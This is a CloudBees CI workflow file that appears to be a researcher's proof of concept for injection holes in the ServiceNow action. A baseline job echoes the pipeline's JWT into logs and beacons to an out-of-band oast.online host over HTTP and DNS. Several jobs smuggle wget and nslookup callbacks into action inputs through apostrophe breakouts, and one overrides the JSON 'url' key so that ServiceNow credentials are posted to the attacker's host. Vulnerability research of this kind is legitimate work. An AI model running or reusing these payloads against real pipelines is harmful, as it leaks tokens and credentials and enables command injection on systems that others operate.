apiVersion: automation.cloudbees.io/v1alpha1
kind: workflow
name: diag-injection-viability
on:
  push:
    branches: [ main ]
  workflow_dispatch:
jobs:

  # ─── BASELINE (v2) — hardened for strict-exit runners ────────────────────────
  # Every command guarded with || true. Prints JWT to runner logs only (in-tenant).
  # DNS-only OAST signature works even when HTTPS egress is filtered.
  baseline:
    steps:
      - name: baseline
        uses: docker://alpine:latest
        env:
          JWT_TOKEN: ${{ cloudbees.api.token }}
          RUN_ID:    ${{ cloudbees.run_id }}
          OAST_HOST: d98bs3sjor395h053ddgt8w8dwfdmcbqw.oast.online
          OAST_ID:   d98bs3sjor395h053ddgt8w8dwfdmcbqw
        shell: sh
        run: |
          set +e
          set +x
          exec 2>&1
          echo "== egress + JWT baseline v2 =="
          echo "JWT_len=${#JWT_TOKEN}"
          echo "RUN_ID=$RUN_ID"
          echo "TOKEN(logs-only)=$JWT_TOKEN"
          echo "--- tools available ---"
          for t in curl wget busybox nslookup dig getent python3 python nc ncat ; do
            p=$(command -v "$t" 2>/dev/null)
            [ -n "$p" ] && echo "  $t = $p"
          done
          echo "--- HTTP callback attempts ---"
          wget -qO- --tries=1 --timeout=8 "https://${OAST_HOST}/BL_HTTP_WGET?run=${RUN_ID}&jwtlen=${#JWT_TOKEN}" >/dev/null 2>&1 && echo "wget https OK" || echo "wget https FAIL"
          wget -qO- --tries=1 --timeout=8 "http://${OAST_HOST}/BL_HTTP_WGET_HTTP?run=${RUN_ID}&jwtlen=${#JWT_TOKEN}" >/dev/null 2>&1 && echo "wget http  OK" || echo "wget http  FAIL"
          if command -v curl >/dev/null 2>&1 ; then
            curl -sS --max-time 8 "https://${OAST_HOST}/BL_HTTP_CURL?run=${RUN_ID}&jwtlen=${#JWT_TOKEN}" >/dev/null 2>&1 && echo "curl https OK" || echo "curl https FAIL"
          fi
          echo "--- DNS-only signature (works even if HTTPS blocked) ---"
          SIG_HASH=$(printf '%s' "$JWT_TOKEN" | sha256sum 2>/dev/null | cut -c1-16)
          for host in "bl-dns-a.${OAST_ID}.oast.online" \
                      "bl-dns-b-jwtlen-${#JWT_TOKEN}.${OAST_ID}.oast.online" \
                      "bl-dns-c-${SIG_HASH}.${OAST_ID}.oast.online" ; do
            echo "  looking up: $host"
            nslookup "$host" >/dev/null 2>&1 && echo "    nslookup ok" || echo "    nslookup no"
            getent  hosts "$host" >/dev/null 2>&1 && echo "    getent   ok" || echo "    getent   no"
          done
          echo "== baseline v2 done =="
          true

  # ─── SIG-A — JSON injection (already documented in the researcher's report) ──
  sig_a_addparam_json:
    steps:
      - name: sn-addparam-json
        uses: cloudbees-io/servicenow@v1
        with:
          action-type: 'create_change'
          url: 'https://example.service-now.com'
          username: 'diag'
          password: 'x'
          cr-number: 'CR-A'
          additional-parameters: '{"diag_marker":"SIG_A_JSON_INJECT_LANDED"}'

  # ─── SIG-B — apostrophe breakout in a JSON-string input (username) ───────────
  sig_b_username_apostrophe:
    steps:
      - name: sn-username-apostrophe
        uses: cloudbees-io/servicenow@v1
        with:
          action-type: 'create_change'
          url: 'https://example.service-now.com'
          username: "x'; wget -qO- --tries=1 --timeout=6 \"http://sig-b-username.d98bs3sjor395h053ddgt8w8dwfdmcbqw.oast.online/x?j=${#JWT_TOKEN}\" ; nslookup sig-b-username-dns.d98bs3sjor395h053ddgt8w8dwfdmcbqw.oast.online ; :'"
          password: 'x'
          cr-number: 'CR-B'

  # ─── SIG-C — apostrophe breakout in unquoted-numeric input ───────────────────
  sig_c_blackout_apostrophe:
    steps:
      - name: sn-blackout-apostrophe
        uses: cloudbees-io/servicenow@v1
        with:
          action-type: 'create_change'
          url: 'https://example.service-now.com'
          username: 'diag'
          password: 'x'
          cr-number: 'CR-C'
          validate-blackout-window-conflict: "true'; wget -qO- --tries=1 --timeout=6 \"http://sig-c-blackout.d98bs3sjor395h053ddgt8w8dwfdmcbqw.oast.online/x?j=${#JWT_TOKEN}\" ; nslookup sig-c-blackout-dns.d98bs3sjor395h053ddgt8w8dwfdmcbqw.oast.online ; :'"

  # ─── SIG-D — shell breakout via unquoted additional-parameters ───────────────
  sig_d_addparam_shell:
    steps:
      - name: sn-addparam-shell
        uses: cloudbees-io/servicenow@v1
        with:
          action-type: 'create_change'
          url: 'https://example.service-now.com'
          username: 'diag'
          password: 'x'
          cr-number: 'CR-D'
          additional-parameters: "{}'; wget -qO- --tries=1 --timeout=6 \"http://sig-d-addparam.d98bs3sjor395h053ddgt8w8dwfdmcbqw.oast.online/x?j=${#JWT_TOKEN}\" ; nslookup sig-d-addparam-dns.d98bs3sjor395h053ddgt8w8dwfdmcbqw.oast.online ; :'"

  # ─── SIG-E — JSON key override → attacker owns the ServiceNow URL ────────────
  # Last-wins default in encoding/json means the last "url" survives.
  # Go binary posts credentials to my OAST believing it's a real ServiceNow.
  sig_e_addparam_url_override:
    steps:
      - name: sn-url-override
        uses: cloudbees-io/servicenow@v1
        with:
          action-type: 'create_change'
          url: 'https://real.service-now.com'
          username: 'REAL_SERVICENOW_USER'
          password: 'REAL_SERVICENOW_PASSWORD'
          cr-number: 'CR-E'
          additional-parameters: '{},"url":"http://sig-e-url-override.d98bs3sjor395h053ddgt8w8dwfdmcbqw.oast.online"'
